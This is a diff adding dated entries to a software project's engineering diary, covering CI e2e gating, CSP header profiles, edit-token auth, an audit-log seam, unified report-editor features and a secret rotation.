+- **`tests/e2e/smoke/editor-auth.feature`** / **`editor-auth.steps.ts`** (tags `@smoke @auth @browser`):
+  Background uploads the REAL `ai-readiness-report.html` fixture (`packages/report-html/src/fixtures/` —
+  also used by `shell.test.ts`; carries a genuine `:root { --bg: #0b0f17; … }` shell and `.chip` elements)
+  via the same session-minting + `request.post` pattern as `auth-upload.steps.ts`, as the SAME fixture
+  user the browser session authenticates as (so the editor's `loadWritableReport` ownership check
+  passes). The scenario then: `page.goto` the editor route, asserts the URL is NOT `/sign-in` (catches a
+  silent auth failure), asserts the `<iframe title="Report editor surface">` is present (SSR-rendered
+  regardless of client mount — catches the #172 SSR-crash class), then asserts (via `frameLocator`) the
+  iframe's `<body>` is `contenteditable="true"` (ProseMirror actually mounted client-side) AND the report's
+  own `--bg` custom property is live inside the iframe's computed style (catches the #171
+  lost-shell-styling class). Deliberately does NOT exercise type→save→new-version — a flaky save step
+  would undermine a smoke; left as a documented follow-up.
+- **`.github/workflows/e2e.yml`** gained `E2E_CLERK_PUBLISHABLE_KEY: ${{ vars.E2E_CLERK_PUBLISHABLE_KEY }}`
+  (a repo variable, not a secret — publishable keys are meant to reach the browser) on the `pnpm e2e` step.
+
+Verified without live Clerk creds (none available in this session): `pnpm install` clean (lockfile
+updated), `bddgen` succeeds, `playwright test --list` shows the three gating states above, an ad hoc
+strict `tsc --noEmit` pass (mirroring root `tsconfig.json`) on all new/changed e2e files is clean
+(`@clerk/testing` types resolve, including the `ticket` strategy variant of `ClerkSignInParams`), `biome
+ci .` clean (the one warning present is the pre-existing, already-documented fixture CSS-specificity
+warning from the prior entry), `docs:check` green. **Not run live** — needs the operator to validate
+against a real preview with all four of `E2E_CLERK_SECRET_KEY` / `E2E_TEST_USER_EMAIL` /
+`E2E_CLERK_PUBLISHABLE_KEY` / `VERCEL_AUTOMATION_BYPASS_SECRET` set.
+
+### 2026-07-09 — Smoke reliability: /health readiness gate closes ADR-0047's race (issue #149)
+
+Every app-preview commit fires TWO `deployment_status: success` events — the initial push-triggered
+build (prod-DB fallback, ADR-0047's accepted soft-isolation residual) and `preview-isolation.yml`'s
+force-redeploy (isolated Neon branch + `R2_KEY_PREFIX`) — indistinguishable from `e2e.yml`'s gate alone,
+so the smoke ran against BOTH: the pre-isolation run hit the DB-writing upload step against an app whose
+`DATABASE_URL` was still prod, 500ing intermittently (and writing real rows to prod when it didn't). Fix
+makes the smoke tell the two deployments apart instead of racing them:
+
+- **`/health` (`apps/app/app/routes/health.tsx`)** gained a fail-soft DB ping (`checks.neon: "ok" |
+  "error"`) plus two new fields: `isolated` (`Boolean(NEON_BRANCH || R2_KEY_PREFIX)`) and `neonBranch`
+  (echoed, `null` when unset). The DB-body logic was extracted to a pure `buildHealthBody()` in the new
+  `apps/app/app/server/health.server.ts` — full unit coverage there (routes otherwise stay e2e-only per
+  the root `vitest.config.ts`), with `pingDb` injected so tests never touch a real Neon connection. The
+  ping itself reuses the app's existing DB path exactly: a new `pingDb(ctx: DbContext)` helper in
+  `packages/adapters/src/client.ts` (`ctx.current().execute(sql\`select 1\`)`) — no new drizzle-orm
+  dependency was added to `apps/app`, which doesn't otherwise depend on it directly. Both the DB-client
+  import and the isolation-marker env read are LAZY/wrapped-in-try-catch inside the loader: `defineEnv()`
+  asserts every required secret and would otherwise turn a misconfigured deploy's `/health` into a 500
+  (docs/infra.md already documents this as the reason data-plane misconfig stays distinguishable from a
+  healthy `/health`) — falls back to raw `process.env.NEON_BRANCH`/`R2_KEY_PREFIX` reads on failure, and
+  the DB import is dynamic so a broken adapters graph can't crash route registration (same shape as the
+  jsdom incident above, different dependency).
+- **`NEON_BRANCH`** is a new optional env var (`packages/env/src/schema.ts`), injected by
+  `preview-isolation.yml`'s existing `set_env` loop (same call, `preview-pr-<N>`, already computed at
+  workflow-`env:` level for the Neon branch itself) — unset on prod and on the pre-isolation build.
+  Teardown needs no change: it deletes every Vercel env var matching the PR's `gitBranch`, key-agnostic.
+- **`e2e.yml`** gained a `concurrency: { group: e2e-${{ deployment.sha }}, cancel-in-progress: true }`
+  block (cancels a still-polling pre-isolation run once the isolated redeploy's event lands) and a new
+  "Readiness gate" step between browser install and the smoke: polls `$PLAYWRIGHT_BASE_URL/health` (with
+  the bypass header, up to 40×3s=120s), and branches three ways — `isolated:true` + `checks.neon:"ok"` →
+  proceed; never saw `isolated:true` in the window → this IS the pre-isolation deployment, skip cleanly
+  (exit 0, no smoke, no failure); saw `isolated:true` but `neon` never `"ok"` → the deployment we actually
+  care about is genuinely broken, fail loud (exit 1). The `pnpm e2e` and report-upload steps are now also
+  gated on `steps.readiness.outputs.ready == 'true'`. Event fields read via `env:` only, matching the
+  existing "Gate" step's injection hygiene.
+- **ADR-0047** amended: the "accepted residual" (a preview built before the workflow finishes uses the
+  prod fallback) is now GATED rather than merely documented — the smoke no longer races it.
+
+TDD on the pure `/health` body builder: 6 cases (isolated false/true via each marker independently, DB
+ping ok/error with the 200-always invariant, top-level fields preserved) — red confirmed (module didn't
+exist) before green. Also added a `NEON_BRANCH` case to `packages/env/src/define-env.test.ts` (red before
+green on the schema addition). Full suite: `pnpm install`, `npx biome ci .` (clean — same one pre-existing
+CSS-specificity warning as prior entries, unrelated), `npx turbo typecheck` (all 12 packages), `npx
+vitest run` (137 files / 1032 tests, all green), `npm run docs:check` all green.
+
+**Cannot be verified in this session**: `e2e.yml`'s `deployment_status` trigger only fires from the
+default branch against a live Vercel preview, and the readiness step's poll loop needs a real, protected
+preview URL + `VERCEL_AUTOMATION_BYPASS_SECRET`. Made correct-by-construction and dry-run-verified instead:
+the `jq` parsing was exercised against sample JSON bodies (isolated/ok, isolated/error, unset) outside CI,
+and `ruby -ryaml` confirms both edited workflow files parse as valid YAML. The operator should watch the
+next PR's Actions run to confirm the pre-isolation invocation actually logs the "skipping smoke" notice
+and the isolated one runs green — that's the one thing only a live merge can prove.
+
+Worktree: `worktree/smoke-readiness-gate` (branch `fix/smoke-readiness-gate`). Not yet merged.
+Not yet merged.
+
+---
+
+### 2026-07-09 — CI trigger inversion: e2e becomes a reusable workflow called from the PR (issue #149, part 2)
+
+The readiness-gate fix above (same day, earlier entry) made the smoke tell the two racing
+`deployment_status` events apart; this entry closes the underlying shape those two events came from.
+`.github/workflows/e2e.yml`'s `on: deployment_status` trigger only ever fires from the **default
+branch** — so a CI change to `e2e.yml` itself could never self-validate on its own PR, it shipped to
+`main` unverified and only got exercised for real on the *next* PR. Inverted instead:
+
+- **`e2e.yml`** dropped `on: deployment_status` for `on: workflow_call` with two required inputs
+  (`base_url`, `head_sha`). Removed entirely: the `concurrency` block (the caller's own per-PR group
+  now governs) and the `gate` step (no `deployment_status` payload to filter — the caller only ever
+  invokes this workflow for the isolated app preview). `Checkout` now pins `ref: inputs.head_sha`;
+  `PLAYWRIGHT_BASE_URL`/the readiness poll's `BASE_URL` now read `inputs.base_url`. The `/health`
+  readiness poll (isolated/`checks.neon`) stays, but is now purely defensive — confirms the caller's
+  contract held and gives a cold Neon branch a warm-up grace window — rather than the primary mechanism
+  for telling two racing deployments apart, since there's only ever one deployment in play now. Never
+  seeing `isolated:true` in the poll window is now a loud failure (`::error::` + exit 1), not a clean
+  skip — that branch shouldn't be reachable given the caller's contract, so treat it as a real
+  regression signal if it ever fires.
+- **`preview-isolation.yml`**'s `isolate` job: the redeploy step now captures the app deployment's
+  `id`/`url` from the Vercel API response BODY (previously only the HTTP status was read; the view
+  project's redeploy stays fire-and-forget), then polls `GET /v13/deployments/{id}` until
+  `readyState: READY` (bounded ~5 min, 60×5s; fails fast on `ERROR`/`CANCELED`). The job gained an
+  `app_url` output (`https://` + the captured url). A new `smoke` job (`needs: isolate`, skipped when
+  `action == closed`) calls `e2e.yml` via `uses: ./.github/workflows/e2e.yml` with
+  `base_url: needs.isolate.outputs.app_url` and `head_sha: github.event.pull_request.head.sha`,
+  `secrets: inherit`.
+- **ADR-0047** amended a second time: the residual noted in the first 2026-07-09 amendment (a preview
+  built before the workflow finishes uses the prod fallback) is now CLOSED rather than merely gated —
+  the pre-isolation deployment is never smoked at all, because there's exactly one e2e invocation per PR
+  push and it always targets the confirmed-isolated, confirmed-`READY` deployment.
+- `tests/e2e/README.md`'s CI section rewritten to describe the new call chain (isolate → redeploy →
+  capture id/url → poll READY → call e2e.yml).
+
+This is a YAML-workflow change with no unit-test surface; validated by construction instead:
+`ruby -ryaml -e "YAML.load_file(...)"` on both files (valid), `npm run docs:check` (green), and a
+line-by-line check that every removed `gate` output reference was also removed downstream (none left).
+`actionlint` was not available in this environment to lint the reusable-workflow contract
+(`workflow_call` input typing, the `uses:`-job shape) mechanically — noted as a gap, not run.
+
+**Cannot be verified in this session**: there is no way to exercise a real `pull_request` event, a real
+Vercel redeploy/readyState poll, or a real reusable-workflow dispatch without a live PR. Made
+correct-by-construction instead. The actual proof is watching **this PR's own Actions run** — for the
+first time, a change to the e2e trigger machinery is exercised by the very PR that makes it, which is
+the whole point of the inversion.
+
+Worktree: `worktree/e2e-trigger-inversion` (branch `ci/e2e-trigger-inversion`). Not yet merged.
+
+---
+
+### 2026-07-09 — Audit log write seam built: the "every mutating action writes a row" claim is now true (issue #153, ADR-0070)
+
+Closes issue #153 and the drift flagged in the 2026-07-07 comments entry above ("**Audit rows were NOT
+added**" — the `audit_log` table existed since Phase 1 but no use case ever wrote to it, despite several
+ADRs claiming otherwise). Rather than quietly walking that claim back in the docs, built the seam: see
+**ADR-0070** for the `AuditLogger` port shape, the commit-last-atomicity model (audit row written
+synchronously inside the same `uow.run` transaction as the mutation — not via async event fan-out off the
+domain-event stream), the full sixteen-action vocabulary, and the deliberate exclusion of system/webhook
+use cases (`processScanResult`, `handleUserDeleted`, `provisionIdentity`), which stay on the existing
+event stream as their trail instead.
+
+All sixteen user-initiated, org-scoped mutating use cases are wired in this pass — report/folder CRUD,
+ACL/write-grant management, comments, and API keys — not just a pattern-proof subset left for later
+follow-up. `docs/db-design.md`'s `audit_log` section and `docs/events.md` (which had listed `AuditLogger`
+as an aspirational event subscriber on nearly every row) are reconciled with this reality; `AuditLogger`
+is no longer in any event's subscriber list. `docs/domain-glossary.md` gained **Audit log** and **Audit
+action** under a new "Cross-cutting infrastructure" section.
+
+Worktree: `worktree/audit-logger` (branch `feat/audit-logger`). Not yet merged.
+
+### 2026-07-10 — In-viewer editing, Phase 3: the edit-route CSP profile (ADR-0063 Decisions 1-2)
+
+Added `editViewHeaders({ appOrigin, reportToUrl? })` to `packages/headers/src/view-headers.ts`, the
+second, route-selected security-header profile ADR-0063 calls for on the viewer origin — alongside the
+existing `viewHeaders()` (public, unauthenticated `GET /<slug>`), never in place of it. TDD, since this
+is security-sensitive: the assertions (`packages/headers/src/view-headers.test.ts`) were written and
+confirmed red (`editViewHeaders` undefined) before the implementation.
+
+`viewHeaders()`'s output is pinned byte-identical by a regression test — Phase 3 touches nothing about
+the public route's headers. The two profiles now share their non-differing directives (`default-src`,
+`img-src`, `font-src`, `frame-ancestors`, `base-uri`, `form-action`, `object-src`, `worker-src`,
+`report-to`) through one internal `CSP_SHARED` table so they can't silently drift apart.
+
+Every relaxation vs the public profile is documented inline in `view-headers.ts` and in the ADR amendment
+(full detail there): no top-level `sandbox` CSP header (the biggest one — the edit route's top-level
+document is the trusted first-party editor, not the untrusted report; the report itself stays contained
+inside the editor's own sandboxed `srcDoc` iframe, which already carries its own restrictive `<meta>` CSP
+per ADR-0062 §9 / PRs #171-172), `connect-src` widened to `'self'` plus exactly the caller-supplied
+`appOrigin` (never `'*'`), and a new `frame-src 'self'` (absent from the public profile) so the editor's
+own report iframe can render. `script-src` stays `'self'` with no `'unsafe-inline'` — confirmed unneeded
+by precedent: `appHeaders()` (the dashboard origin) already ships the same restriction for the same
+Remix/React stack. `Cache-Control` is `no-store` (authenticated, per-user route, vs the public route's
+`private, max-age=60`).
+
+Nothing wires this profile to a route yet — Phase 4. It is an inert, pure, unit-tested header builder
+until then; the `/security-review` this ADR's Status is gated on runs against the wired surface, not this
+function in isolation. Two open items flagged in the ADR for that review: whether "top-level not
+sandboxed" is acceptable given this is the first authenticated, first-party-JS-bearing route ever added
+to `view.<domain>`, and confirming `frame-src 'self'` actually permits the `srcDoc` iframe in every
+target browser (spec/implementation history here has been inconsistent).
+
+Gates green: `biome ci .` (0 errors — 1 pre-existing, unrelated warning in an unrelated report-html
+fixture), `turbo typecheck` (12/12), `vitest run` (141 files / 1091 tests), `docs:check`. This worktree's
+`node_modules` needed a fresh `pnpm install` before `turbo typecheck` would resolve `@remix-run/node`
+types — an environment gap, not a code issue; noted here in case it recurs.
+
+Worktree: `worktree/view-origin-editing` (branch `feat/view-origin-editing`, off `main`). Not yet merged;
+not pushed.
+
+### 2026-07-10 — Unified document experience epic: app-origin foundation shipped (Phases 0–4b), view-origin client underway (4c)
+
+The "one experience on `view.<domain>`" epic (merge the fragmented public-viewer / dashboard-editor /
+dashboard-versions surfaces into a single authenticated in-viewer experience — ADR-0063). Operator chose
+the **view-origin** path (the ambitious, security-gated one) and full scope (**Compare/diff included**,
+shared code **extracted** into packages, not copied). Delivered as a sequence of focused PRs, each built
+by a Sonnet agent with the orchestrator reviewing every diff + running gates:
+
+- **#178 (Phase 0)** — report-row cleanup: dropped the 3 per-row buttons; the row itself opens the report
+  via a CSP-safe stretched-link; rename moved into the kebab.
+- **#179 (Phase 1)** — version authorship surfaced in the versions list (`uploadedBy` → author email,
+  with the `findEmailByUserId` soft-delete PII filter fixed at source, ADR-0054/0070).
+- **#180 (Phase 2)** — the scoped **edit-token codec** (`packages/domain/src/edit-token.ts`):
+  `scope:"edit"` + `sub`, slug-bound, HMAC-signed, cross-parse-guarded against the owner access token.
+- **#181 (Phase 3)** — the second **edit-route CSP profile** (`editViewHeaders`), plus the
+  `appOrigin`-validation hardening (`new URL().origin`, no CSP directive injection).
+- **#182 (Phase 4b)** — **ADR-0071**: extracted `packages/ui` (`arp-ui`, the Forge & Ember primitives)
+  + `packages/editor` (`arp-editor`, the ProseMirror plumbing + `ReportEditor`) out of `apps/app`, so the
+  view-origin editor imports one copy — critically, one copy of `iframe-document.ts`'s sandbox CSP.
+- **#183 (Phase 4a)** — the **app-origin edit-token API seam**: mint at `/open` for a canWrite non-owner
+  (15-min TTL); `resolveEditTokenActor` acceptance boundary wired as the LAST front door in both actor
+  resolvers, slug-gated (can't become a general Clerk bypass), `reports:write`-scope only (never
+  `acl:write`), with a LIVE `loadWritableReport` re-check honoring grant revocation; new token-auth
+  endpoints `POST .../versions` (save) + `GET .../diff` (JSON); locked-down CORS (exact `VIEW_ORIGIN`,
+  never `*`/reflected, never `Allow-Credentials`, Bearer-header auth → no CSRF, fail-closed when unset).
+  **Passed an independent `/security-review`** (the ADR-0063 gate): zero HIGH/MEDIUM findings; the one
+  borderline item (edit token also usable for move/rename) filtered as a false positive (2/10 — the
+  write-grantee already holds that capability via their session; no escalation). Forward gate recorded
+  (**F-1**): the `/diff` payload is HTML derived from stored bodies, so the 4c client MUST render it
+  through the viewer's sandboxed-iframe + CSP (ADR-013) and SW block (ADR-014), never unsandboxed.
+
+**In progress — Phase 4c** (`worktree/view-unified`, branch `feat/view-unified-experience`): the
+view-origin unified client — `apps/view`'s first hydrated route + Tailwind pipeline, the edit-token
+validate seam + `editViewHeaders`, the unified layout (View⇄Edit toggle, Comments/Versions tabs
+hidden-by-default, Compare), and cross-origin writes to the #183 API. Gated on a second `/security-review`
+of the assembled view-origin auth+JS surface before merge. Phase 5 (cutover — retire the split app
+`/edit` + `/versions` routes) follows.
+
+Note: local `main` in the primary checkout diverged (holds an un-pushed `06a4353` `/ce-dogfood` docs
+commit while `origin/main` moved ahead) — all epic worktrees branch off `origin/main`, so nothing is
+lost; reconcile the primary checkout's `main` when convenient.
+
+### 2026-07-10 — Unified document experience epic: Phase 5 cutover complete, epic closed
+
+Phase 5 (`worktree/phase5-cutover`, branch `feat/unified-cutover`) finished the cutover the 4c client
+entry above left in progress, in three slices:
+
+- **5-A (owner-routing + re-mint)** — `GET /reports/{slug}/open` collapsed from its old two-tier design
+  (owner got a 24h `owner:true` `Access token` + the old read-only viewer; a write-grantee got the 15-min
+  `scope:"edit"` token + the unified experience) down to ONE gate: `loadWritableReport` (`isOwner OR
+  hasWriteGrant`) mints the SAME edit token for every canWrite user, owner or grantee, who all land in
+  the unified in-viewer experience identically. `OWNER_TTL_SECONDS`/`mintAccessToken` removed as dead
+  code from `open-report.server.ts`; the separate public gated-view/unlock flow (`unlock.$slug.tsx`) is
+  untouched — it never minted `owner:true` from this call site. Added `POST
+  /api/v1/reports/{slug}/edit-token`, a silent-refresh endpoint so a live editing session doesn't need a
+  full round-trip back through Clerk every 15 minutes — re-runs `loadWritableReport` LIVE on every
+  refresh, so a revoked grant or ownership change cuts a session off within one remaining TTL. Flagged for
+  `/security-review`: an edit token is now refreshable for as long as `canWrite` holds, so a leaked token's
+  effective life is no longer capped at 15 minutes — mitigated by narrow scope
+  (`reports:write` only), the live re-check, and the token never leaving the edit-route CSP's controlled
+  surface; an absolute session cap was considered and deliberately left unbuilt for the reviewer to weigh.
+- **5-B (view refresh / default-View / post-save fix)** — the unified client now silently refreshes its
+  edit token in the background (via the new endpoint) instead of degrading mid-session; the experience
+  defaults to read-only **View** mode rather than dropping straight into Edit; and a post-save staleness
+  bug (the Versions tab not reflecting a just-saved version without a manual reload) was fixed by
+  re-fetching versions after save.
+- **5-C (dashboard editor retirement, this slice)** — with every canWrite user already routed through the
+  unified experience, the dashboard's own HTML editor pages had zero remaining traffic path and were
+  deleted outright: `apps/app/app/routes/reports.$slug.{edit,versions,diff}.tsx` + `reports.$slug.comments.ts`
+  (the same-origin action `CommentSidebar` posted to) + `CommentSidebar.tsx`/`comment-composer-lifecycle.ts`
+  (superseded by `apps/view`'s own `CommentsPanel`). Two now-orphaned app-local helpers went with them
+  (`comment-dto.server.ts`, `comment-intent.server.ts` — grep-verified zero remaining callers; the
+  `/api/v1` comments routes have always serialized through `arp-http`'s own mappers, never these). Every
+  `/api/v1/reports/{slug}/*` endpoint, the edit-token codec, and `apps/view`'s editor were untouched — the
+  API was always the cross-origin data plane, independent of whether a same-origin dashboard page also
+  existed. The one CI-wired e2e that drove the dashboard editor in a real browser
+  (`tests/e2e/smoke/editor-auth.feature`, issue #173) is retrimmed rather than deleted: it now asserts
+  only the app-side half of the hand-off that still exists (`/open` authenticates + redirects to an
+  edit-shaped `view.<domain>` URL), with a TODO flagging that real-browser render/hydration coverage for
+  the unified editor itself has no home yet — `VIEW_ORIGIN` isn't wired for preview envs
+  (`infra/terraform/envs/prod/main.tf` scopes it to `production` only) and there's no cross-origin
+  Playwright harness for `apps/view`. `tests/e2e/smoke/app-route-boot.feature` (the #163/#167 module-boot
+  regression guard) retargeted from the deleted route to `GET /api/v1/reports/{slug}/diff`, which imports
+  `arp-report-html` at module scope just the same. Three backlog `.feature` files that existed only to
+  spec the now-deleted dashboard pages (never wired into `playwright.config.ts`, no step definitions) were
+  deleted rather than left describing dead surface; `comment-on-a-report.feature`'s still-valid API
+  scenarios are untouched. Full detail: ADR-0063 "Phase 5-C".
+
+**Epic closed.** The public viewer, the dashboard editor, the dashboard versions/diff pages, and the
+comment sidebar are consolidated into one authenticated surface: `view.<domain>/<slug>/edit`, reached
+one-click from the dashboard by any canWrite user. `app.<domain>` keeps the report list, upload, sharing,
+folders, and org/settings management — content editing lives on the viewer origin exclusively now.
+
+Gates green on this slice: `pnpm install`, `turbo typecheck`, `biome ci .`, full `vitest run`,
+`docs:check`, `turbo build` (both apps).
+
+## 2026-07-12 — Unified-editor feedback wave: chrome cleanup, author names, comment intents, full-height panes
+
+Turned the in-viewer-editor design feedback (left as comments on the `yRlDEWhlfF` concept report,
+read via the new `reports_list_comments` MCP tool — PR #191) into four shipped changes on the
+`view.<domain>/<slug>/edit` surface (ADR-0063):
+
+- **#192 chrome cleanup** — stripped the View/Edit toggle + Comments/Versions top-bar buttons; the
+  panel is collapsed-by-default behind a badged edge chevron (unresolved-comment count), tabs moved
+  inside the panel. View mode removed (unreachable once the toggle went); Compare/diff intact.
+- **#193 author identity** — comments + versions now surface the author's email (the only resolvable
+  identity attribute; no display-name is stored) via a route-layer `resolveAuthorEmails` enrichment on
+  the authenticated, org-scoped Bearer API only. `/security-review` clean (email never on the public
+  viewer / write-response / error / log paths).
+- **#194 comment intent** — closed enum `note|enhancement|add|remove` (default `note`) through the whole
+  stack (domain VO → use cases → API 422-on-invalid → pg enum migration 0015 → composer + reply
+  selector). ADR-0064 Decision 8. Agent-action semantics that CONSUME the intent are deferred.
+- **#195 full-height panes** — reworked the shell into a fixed `h-dvh` app frame with two independent
+  scrollbars (edge-to-edge report iframe carries its own scroll; the panel's tab header is pinned and
+  only its list scrolls), per screenshot feedback that it read like a form, not a page.
+
+**Merge-drift caught:** #192/#193/#194 each passed CI in isolation, but the 3-way union left
+`arp-view typecheck` red on `main` — #194 made `CommentWire.intent` required while #192/#193 fixtures
+predated the field. Repaired in #195's first commit (`intent: "note"` added to `panel.test.ts` +
+`CommentsPanel.test.ts`). Also: a client-bundle build break (importing the `arp-domain` value barrel —
+and its `node:crypto` — into a browser component) surfaced only in the Vercel build, not `tsc`/`vitest`;
+fixed by switching to a type-only import (#194). Lesson logged: never import a runtime value from the
+`arp-domain` barrel into an `apps/view` client component.
+
+The `yRlDEWhlfF` concept report (title "One Document Experience") was refreshed to v4 to reflect the
+shipped design. New MCP surface: comment tools (`reports_list_comments|add_comment|resolve_comment|delete_comment`)
+on `arp-mcp`, thin client over the existing `/api/v1` comment routes (ADR-003).
+
+## 2026-07-13 — Unified-editor round 2: pagination, comment editing, display-names, panel polish
+
+Second wave of `view.<domain>/<slug>/edit` improvements (ADR-0063), from the "what's missing" review of
+round 1. All merged; `main` green (turbo typecheck 14/14 on the merged tree):
+
+- **#197 panel polish** — intent chip on each comment (calm `note` = no chip), initials avatar, relative
+  timestamps ("2h ago", absolute in `title`). Pure helpers in `comment-format.ts` (apps/view has no jsdom
+  tier — pure logic is the test seam).
+- **#199 pagination** — the `/edit` loader consumed only the first `limit=100` page and dropped `has_more`
+  (silent truncation, the #184 "v1 cap"). Now fetch-all via the ADR-0053 cursor envelope, with a
+  `MAX_PAGES=20` (2000-item) safety cap that logs on truncation.
+- **#200 author display-names** — `users.display_name` (migration 0016, nullable), captured from Clerk at
+  JIT provisioning (a `name` session claim on the browser hot path — no extra round-trip; `fullName`/
+  `firstName lastName`/`username` on OAuth), length-capped, COALESCE-preserved. Rendered `name → email →
+  "Unknown user"`; avatar initials derive from the name. New glossary terms **Display name** + **Author
+  Identity** (a route-layer DTO, not a domain aggregate — really an ADR-0048 identity-mirror extension;
+  a dedicated ADR to correct the inherited "ADR-0063 author display" mis-citation is a tracked follow-up).
+- **#201 comment editing** — edit a comment's `body`/`intent` after posting. `PATCH …/comments/{id}` is
+  overloaded on body shape (no JSON body → the unchanged resolve; `{body?,intent?}` → edit), author-or-owner
+  gated (mirroring resolve/delete, ADR-0064 §3/§7 amended), + a `reports_edit_comment` MCP tool + inline
+  edit UI. Anchor immutable; no `edited_at` indicator yet (fast-follow). `{intent:null}` treated as
+  unchanged (not a reset to note).
+
+Both #200 and #201 passed an independent `/security-review` clean (PII fenced to the authenticated
+org-scoped API; the new PATCH write path preserves resolve + author-or-owner gating, no prototype-pollution
+/ IDOR). Also merged: **#196** removed dead `versionsToDto` and repaired the last of a 3-way-merge
+`arp-app` typecheck drift (each parallel PR was green in isolation; the union wasn't — a recurring hazard
+worth a post-merge main-typecheck guard).
+
+**Recurring lesson (logged):** never import a runtime VALUE from the `arp-domain` barrel into an
+`apps/view` client component — it drags `node:crypto` (signed-token) into the browser bundle and fails the
+Vite/Rollup build, which `tsc`/`vitest` (node env) don't catch; only `pnpm --filter arp-view build` does.
+Use `import type` only.
+
+**Next:** the intent **agent-action pipeline** (PRD issue #198, design-first — needs an ADR; it's the
+ADR-0069 lethal-trifecta surface) is the real remaining payoff; the collaboration epics (real-time,
+notifications, @mentions/assignment) still need PRDs.
+
+### 2026-07-16 — Round-2 close-out: comment-polish batch, display-name backfill, TF secret reconcile (#204/#205/#206)
+
+Three PRs merged after the 2026-07-13 round-2 entry, closing out the shipped editor surface and the
+one open infra-drift item. `main` green through all three (turbo typecheck 14/14 on the merged tree).
+
+- **#204 comment-polish batch** (`feat/comment-polish-batch`) — the deferred UX finishers from the
+  round-2 review:
+  - **Edited marker** — a comment edited after posting now renders an `(edited)` indicator (the
+    fast-follow explicitly deferred in #201, which shipped the edit path without the marker). Driven off
+    the existing PATCH-edit write path; no new domain field beyond the already-persisted edit timestamp.
+  - **Reply-edit UI** — the inline edit affordance, previously only on root comments, now also applies to
+    replies (same author-or-owner gate, ADR-0064 §3/§7).
+  - **Concurrency guard engaged** — an optimistic-concurrency check on the comment mutation path so two
+    in-flight edits/resolves against the same comment can't silently clobber each other (the guard was
+    scaffolded earlier but not wired; this "engages" it).
+  - **Hidden `note` default** — `note` intent stays chip-less (calm default), consistent with #197's
+    display polish; the composer no longer surfaces `note` as a loud choice.
+  - **DRY pass** — de-duplicated the comment-composer/edit lifecycle logic flagged in the #199/#200
+    review (task #58's pagination-DRY companion, now on the comment side).
+- **#205 display-name backfill** (`feat/display-name-backfill`) — resolves dogfood **finding F1**
+  (`docs/dogfood-reports/2026-07-13-unified-editor.md`): every pre-#200 user had `display_name = null`,
+  so authors rendered as email until their next sign-in. Shipped the **one-time backfill** (option (a)
+  from the dogfood recommendation) — a bounded use case that populates `users.display_name` for already-
+  mirrored users, so names appear immediately instead of waiting on a re-auth. Names now render
+  `name → email → "Unknown user"` with the backfilled value. Also folded in an identity hardening fix:
+  **an unparseable `maxUsers` is now rejected (400) instead of being silently capped** — surfaced while
+  touching the identity-mirror path.
+- **#206 Terraform secret reconcile** (`chore/tf-view-secret-reconcile`) — closed the
+  `VIEW_ACCESS_TOKEN_SECRET` state drift by bumping `keepers.rotation` on
+  `random_password.view_access_token_secret`, forcing a regeneration that the **CI apply-prod pipeline**
+  applied on merge (ADR-017/018 everything-as-code — **no manual `tf.sh apply`**; the plan diff was the
+  expected "1 to add, 2 to change, 1 to destroy" = secret replaced + the two consuming env vars updated).
+  The rotation runbook in `docs/infra.md` gained a caveat about the **redeploy mismatch window**:
+  redeploying only ONE of `arp-app-prod`/`arp-view-prod` after a rotation leaves the origins on mismatched
+  secrets (the 2026-06 P0 class) — redeploy both back-to-back; redeploying neither is safe, exactly one is
+  the danger.
+
+Also landed alongside the batch: **#202** logged the round-2 diary entry, **#203** published the
+live-prod dogfood report (`docs/dogfood-reports/2026-07-13-unified-editor.md`), and **#196** removed dead
+`versionsToDto` while repairing a 3-way-merge `arp-app` typecheck drift.
+
+**State after this close-out — what's shipped vs. what's left:**
+- **Shipped:** the entire unified in-viewer editing epic (ADR-0062–0067) — editor, comments + intent +
+  editing, version history + visual diff, author display-names + backfill, full-height/independent-scroll
+  shell — plus the Phase-5 dashboard-editor retirement and this infra reconcile.
+- **Missing / pending:** **#44** (wire `SCAN_DRAIN_SECRET` into CI to unblock the full authenticated
+  browser-render e2e on previews — the reason the editor's visual flows are still a manual checklist);
+  **#56 / PRD #198** the comment-`intent` agent-action pipeline (the enhancement/add/remove *consumer* —
+  intent is a stored label with nothing acting on it yet; needs an ADR, ADR-0069 surface); **#60**
+  deferred #204/#205 review follow-ups (atomic concurrency guard hardening, internal-route auth tests +
+  helper DRY); and the collaboration epics (real-time, notifications, @mentions/assignment) which still
+  need PRDs. Author-display carries a tracked doc-debt: a dedicated ADR to correct the inherited
+  "ADR-0063 author display" mis-citation (it's really an ADR-0048 identity-mirror extension).
+- **Next:** design-first on PRD #198 (the intent consumer) is the real remaining editor payoff.
+
+Worktree: `worktree/diary-round2-close` (branch `docs/diary-round2-close`) — housekeeping only, no code.
+The companion Centaur Spec roadmap report (slug `qqjM8VYe2-`) was refreshed the same day with the same
+Done / Missing / Next framing.
